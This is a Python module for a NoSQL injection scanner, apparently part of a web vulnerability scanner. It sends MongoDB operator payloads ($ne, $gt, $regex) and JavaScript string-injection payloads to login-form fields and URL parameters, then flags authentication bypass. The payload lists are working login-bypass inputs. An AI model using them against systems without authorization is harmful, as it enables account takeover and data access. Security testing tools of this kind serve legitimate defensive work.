"""
NoSQL Injection Scanner
Detects MongoDB and other NoSQL injection vulnerabilities
"""

import asyncio
import json
import re
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode


class NoSQLiScanner:
    """Scanner for NoSQL Injection vulnerabilities"""
    
    def __init__(self, config, session):
        """Initialize NoSQL Injection scanner"""
        self.config = config
        self.session = session
        self.vulnerabilities = []
        
        # NoSQL injection payloads
        self.nosql_payloads = {
            'authentication_bypass': [
                {"$ne": None},
                {"$ne": ""},
                {"$gt": ""},
                {"$regex": ".*"},
                {"$exists": True},
            ],
            'operator_injection': [
                '{"$gt": ""}',
                '{"$ne": null}',
                '{"$nin": []}',
                '{"$regex": ".*"}',
            ],
            'string_injection': [
                "'||'1'=='1",
                "' || '1'=='1",
                "'; return true; var foo='",
                "'; return 1==1; var foo='",
                "\\'; return true; var foo=\\'",
            ],
        }
        
        # Success indicators
        self.success_indicators = [
            'login successful',
            'welcome',
            'dashboard',
            'profile',
            'logout',
            'authenticated',
        ]
        
    async def scan(self, target: str, recon_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Scan for NoSQL Injection vulnerabilities
        """
        self.vulnerabilities = []
        
        print(f"[*] NoSQL Injection Scanner: Testing {target}")
        
        # Test forms (especially login forms)
        if recon_data.get('forms'):
            for form in recon_data['forms']:
                await self._scan_form(target, form)
        
        # Test URL parameters
        parsed = urlparse(target)
        if parsed.query:
            await self._scan_url_params(target)
        
        return self.vulnerabilities
    
    async def _scan_form(self, target: str, form: Dict[str, Any]):
        """Test form for NoSQL injection"""
        action = form.get('action', '')
        method = form.get('method', 'GET').upper()
        inputs = form.get('inputs', [])
        
        # Build form URL
        if action:
            form_url = urljoin(target, action)
        else:
            form_url = target
        
        # Look for authentication-related fields
        auth_fields = ['username', 'user', 'email', 'login', 'password', 'pass']
        
        for input_field in inputs:
            input_name = input_field.get('name', '')
            
            if not input_name:
                continue
            
            # Check if it's an auth field
            if any(af in input_name.lower() for af in auth_fields):
                await self._test_nosql_injection_form(form_url, method, input_name, inputs)
    
    async def _scan_url_params(self, url: str):
        """Test URL parameters for NoSQL injection"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param_name in params.keys():
            await self._test_nosql_injection_url(url, param_name)
    
    async def _test_nosql_injection_form(self, url: str, method: str, param: str,
                                        all_inputs: List[Dict]):
        """Test form for NoSQL injection"""
        
        # Build base data
        data = {}
        for inp in all_inputs:
            name = inp.get('name', '')
            if name:
                data[name] = inp.get('value', 'test')
        
        # Get baseline response
        baseline_response = await self._get_response(url, method, data)
        if not baseline_response:
            return
        
        baseline_content, baseline_status = baseline_response
        
        # Test operator injection (JSON)
        for payload_type, payloads in self.nosql_payloads.items():
            for payload in payloads:
                test_data = data.copy()
                
                # Try as JSON object
                if isinstance(payload, dict):
                    test_data[param] = json.dumps(payload)
                else:
                    test_data[param] = payload
                
                test_response = await self._get_response(url, method, test_data)
                if not test_response:
                    continue
                
                test_content, test_status = test_response
                
                # Check for successful injection
                if await self._is_nosql_vulnerable(baseline_content, baseline_status,
                                                  test_content, test_status):
                    self.vulnerabilities.append({
                        'type': 'nosqli',
                        'severity': 'high',
                        'url': url,
                        'parameter': param,
                        'method': method,
                        'payload': str(payload),
                        'payload_type': payload_type,
                        'evidence': 'Authentication bypass or data manipulation detected',
                        'description': f'NoSQL Injection vulnerability - {payload_type}',
                        'remediation': 'Validate and sanitize all input. Use parameterized queries. Implement proper authentication.',
                        'cwe': 'CWE-943',
                        'owasp': 'A03:2021 - Injection',
                    })
                    return  # Found vulnerability
        
        # Test with Content-Type: application/json
        await self._test_json_injection(url, method, param, data, baseline_content, baseline_status)
    
    async def _test_json_injection(self, url: str, method: str, param: str, 
                                   base_data: Dict, baseline_content: str,
                                   baseline_status: int):
        """Test NoSQL injection via JSON content type"""
        
        for payload in self.nosql_payloads['authentication_bypass']:
            json_data = base_data.copy()
            json_data[param] = payload
            
            try:
                headers = {'Content-Type': 'application/json'}
                json_body = json.dumps(json_data)
                
                if method == 'POST':
                    async with self.session.post(url, data=json_body, headers=headers, timeout=10) as response:
                        test_content = await response.text()
                        test_status = response.status
                else:
                    async with self.session.get(url, data=json_body, headers=headers, timeout=10) as response:
                        test_content = await response.text()
                        test_status = response.status
                
                if await self._is_nosql_vulnerable(baseline_content, baseline_status,
                                                  test_content, test_status):
                    self.vulnerabilities.append({
                        'type': 'nosqli',
                        'severity': 'high',
                        'url': url,
                        'parameter': param,
                        'method': method,
                        'payload': str(payload),
                        'payload_type': 'json_injection',
                        'evidence': 'Authentication bypass via JSON injection',
                        'description': 'NoSQL Injection vulnerability via JSON content type',
                        'remediation': 'Validate JSON input strictly. Implement proper authentication and input sanitization.',
                        'cwe': 'CWE-943',
                        'owasp': 'A03:2021 - Injection',
                    })
                    return
            
            except Exception:
                pass
    
    async def _test_nosql_injection_url(self, url: str, param: str):
        """Test URL parameter for NoSQL injection"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Get baseline
        baseline_response = await self._get_response(url, 'GET')
        if not baseline_response:
            return
        
        baseline_content, baseline_status = baseline_response
        
        # Test string-based injections
        for payload in self.nosql_payloads['string_injection']:
            test_params = params.copy()
            test_params[param] = [payload]
            
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            test_response = await self._get_response(test_url, 'GET')
            if not test_response:
                continue
            
            test_content, test_status = test_response
            
            if await self._is_nosql_vulnerable(baseline_content, baseline_status,
                                              test_content, test_status):
                self.vulnerabilities.append({
                    'type': 'nosqli',
                    'severity': 'high',
                    'url': url,
                    'parameter': param,
                    'method': 'GET',
                    'payload': payload,
                    'payload_type': 'string_injection',
                    'evidence': 'NoSQL injection successful',
                    'description': 'NoSQL Injection vulnerability in URL parameter',
                    'remediation': 'Validate and sanitize all input. Use parameterized queries.',
                    'cwe': 'CWE-943',
                    'owasp': 'A03:2021 - Injection',
                })
                return
    
    async def _is_nosql_vulnerable(self, baseline_content: str, baseline_status: int,
                                   test_content: str, test_status: int) -> bool:
        """Check if NoSQL injection was successful"""
        
        # Check for authentication bypass indicators
        if baseline_status in [401, 403] and test_status == 200:
            return True
        
        # Check for success indicators in response
        if test_status == 200:
            for indicator in self.success_indicators:
                if indicator in test_content.lower() and indicator not in baseline_content.lower():
                    return True
        
        # Check if response significantly changed
        if test_status == 200 and baseline_status == 200:
            if len(test_content) > len(baseline_content) * 1.5:
                return True
        
        return False
    
    async def _get_response(self, url: str, method: str = 'GET', 
                           data: Dict = None) -> tuple:
        """Get HTTP response"""
        try:
            if method == 'POST':
                async with self.session.post(url, data=data, timeout=10) as response:
                    content = await response.text()
                    return content, response.status
            else:
                if data:
                    async with self.session.get(url, params=data, timeout=10) as response:
                        content = await response.text()
                        return content, response.status
                else:
                    async with self.session.get(url, timeout=10) as response:
                        content = await response.text()
                        return content, response.status
        
        except Exception:
            return None
